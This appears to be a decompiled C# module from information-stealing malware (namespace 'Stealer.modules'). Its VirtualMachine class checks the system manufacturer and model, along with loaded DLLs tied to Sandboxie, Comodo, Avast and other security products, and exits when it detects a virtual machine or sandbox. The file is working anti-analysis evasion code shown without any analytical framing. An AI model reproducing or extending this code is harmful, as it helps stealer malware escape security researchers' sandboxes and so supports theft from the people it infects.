using System;
using System.Management;
using System.Runtime.InteropServices;

namespace Stealer.modules
{
	// Token: 0x0200003A RID: 58
	internal class VirtualMachine
	{
		// Token: 0x06000138 RID: 312 RVA: 0x0000DE0C File Offset: 0x0000C00C
		public static void CheckVM()
		{
			if (VirtualMachine.DetectVM())
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x06000139 RID: 313 RVA: 0x0000DE1C File Offset: 0x0000C01C
		private static bool DetectVM()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string text = managementBaseObject["Manufacturer"].ToString().ToLower();
							if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox" || VirtualMachine.GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || VirtualMachine.GetModuleHandle("SxIn.dll").ToInt32() != 0 || VirtualMachine.GetModuleHandle("SbieDll.dll").ToInt32() != 0 || VirtualMachine.GetModuleHandle("Sf2.dll").ToInt32() != 0 || VirtualMachine.GetModuleHandle("snxhk.dll").ToInt32() != 0)
							{
								return true;
							}
						}
					}
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600013A RID: 314
		[DllImport("Kernel32.dll")]
		public static extern IntPtr GetModuleHandle(string running);
	}
}
